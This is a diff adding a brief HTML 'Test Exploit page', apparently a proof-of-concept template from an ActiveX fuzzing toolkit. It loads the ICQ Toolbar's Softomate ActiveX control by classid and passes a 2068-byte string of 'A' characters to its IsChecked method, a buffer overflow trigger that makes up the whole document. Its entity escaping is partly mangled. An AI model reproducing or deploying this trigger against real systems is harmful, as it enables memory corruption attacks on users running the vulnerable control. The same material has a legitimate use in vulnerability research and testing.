@@ -1,0 +1,20 @@
+&lt;html&gt;
+Test Exploit page
+&lt;object classid=&amp;apsclsid:855F3B16-6D32-4FE6-8A56-BBB695989046&amp;aps id=&amp;apstarget&amp;aps &gt;&lt;/object&gt;
+&lt;script language=&amp;apsvbscript&amp;aps&gt;
+
+
+&amp;apsWscript.echo typename(target)
+
+&amp;apsfor debugging/custom prolog
+targetFile = &quot;D:\Program Files\ICQToolbar\toolbaru.dll&quot;
+prototype = &quot;Function IsChecked ( ByVal url As String ) As Long&quot;
+memberName = &quot;IsChecked&quot;
+progid = &quot;SoftomateLib.SoftomateObj&quot;
+argCount = 1
+
+arg1=String(2068, &quot;A&quot;)
+
+target.IsChecked arg1
+
+&lt;/script&gt;
